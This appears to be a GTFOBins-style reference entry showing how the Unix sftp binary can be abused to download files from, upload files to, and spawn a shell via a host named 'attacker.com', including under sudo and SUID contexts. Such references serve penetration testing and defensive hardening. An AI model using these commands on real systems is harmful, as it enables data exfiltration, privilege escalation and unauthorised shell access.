---
type: gtfobin
name: sftp
platform: Unix
functions: [download, shell, upload]
tags: [gtfobin, unix, lotl]
---

# sftp

## download

```bash
sftp user@attacker.com
get /path/to/input-file /path/to/output-file
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
sftp user@attacker.com
!/bin/sh
```
_This still requires a successfull connection to the server._
**Contexts:** sudo, suid, unprivileged

## upload

```bash
sftp user@attacker.com
put /path/to/input-file /path/to/output-file
```
**Contexts:** sudo, suid, unprivileged
